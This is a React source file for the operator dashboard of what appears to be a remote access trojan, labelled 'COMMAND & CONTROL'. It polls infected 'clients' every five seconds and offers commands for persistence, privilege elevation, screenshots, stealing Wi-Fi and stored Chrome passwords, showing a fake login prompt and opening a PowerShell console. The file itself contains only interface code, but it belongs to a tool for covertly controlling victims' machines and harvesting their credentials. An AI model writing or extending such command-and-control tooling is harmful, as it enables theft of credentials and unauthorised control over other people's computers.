import React, {useEffect, useState} from 'react';
import {useParams} from "react-router-dom";
import Title from "../../Title/Title";
import './ClientControl.css';
import {Spinner} from "reactstrap";
import ClientControlSection from './ClientControlSection'
import ClientControlCommand from './ClientControlCommand'
import ClientControlResponse from './ClientControlResponse';
import ClientControlInformationTable from './ClientControlInformationTable';
import Accordion from '../../Accordion/Accordion'
import axios from "../../../axios";
import styled from '@emotion/styled';

// TODO: get list of commands from DB
const commands = {
    'stayhome': 'Persistence',
    'elevate': 'Elevate',
    'upload': 'Upload',
    'download': 'Download',
    'change-image': 'Change Background',
    'capture': 'Take screenshot',
    'getwifi': 'Get Wifi Passwords',
    'webPass': 'Get Stored Chrome Passwords',
    'PromptUser': 'Prompt User UI Login',
    'get-network': 'Get Network Information',
    'StartPS': 'Start Powershell Console'
}

const ClientControl = () => {
    const {id} = useParams();
    const [client, setClient] = useState(undefined);
    const [clientStatus, setClientStatus] = useState(true);
    const [clientResponse, setClientResponse] = useState();
    const [allResponses, setAllResponses] = useState([]);


    useEffect(() => {
        const getClient = () => {
            axios({
                method: 'POST',
                headers: {
                    'x-access-token': localStorage.getItem('token')
                },
                url: '/api/clients/client',
                data: {
                    id: id
                }
            }).then((data) => {
                if (Object.keys(data.data).length !== 0) {
                    delete data.data.user.__v
                    delete data.data.user._id
                    setClient(data.data.user);
                    setClientStatus(data.data.user.isConnected);
                } else
                    return setClientStatus(false);
            }).catch((err) => {
                setClientStatus(false)
            });

            const getResponse = () => {
                axios({
                    headers: {
                        'Content-Type': 'application/json',
                        "x-access-token": localStorage.getItem('token')
                    },
                    url: `/api/response`,
                    method: 'post',
                    data: JSON.stringify({id: id})
                })
                    .then(data => {
                        if (Object.keys(data.data).length !== 0) {
                            setClientResponse(data.data);
                            setAllResponses(oldArray => [...oldArray, data.data]);
                        }
                    })
                    .catch(e => e)
            }
            getResponse();
        }
        getClient();
        let handle = setInterval(getClient, 5000);
        return () => {
            clearInterval(handle);
        };
    }, [id]);

    return (
        <div className="controlPageWrapper">
            <div className="title">
                <Title text1="COMMAND & CONTROL" open={true}/>
            </div>
            <Wrapper>
                {client !== undefined ?
                <>
                    <Accordion title="Client Information">
                        <ClientControlInformationTable client={client}/>
                    </Accordion>
                    <Accordion title="Command">
                        <ClientControlCommand client={client} commands={commands}/>
                    </Accordion>
                    <Accordion title="Response">
                        <ClientControlResponse clientResponse={clientResponse} allResponses={allResponses}/>
                    </Accordion>
                </> : <Spinner actions={"border"} color={"success"} type="grow"/>
                }
            </Wrapper>
        </div>
    );
}

export default ClientControl;

const Wrapper = styled.div`
    margin: 0 auto;
`
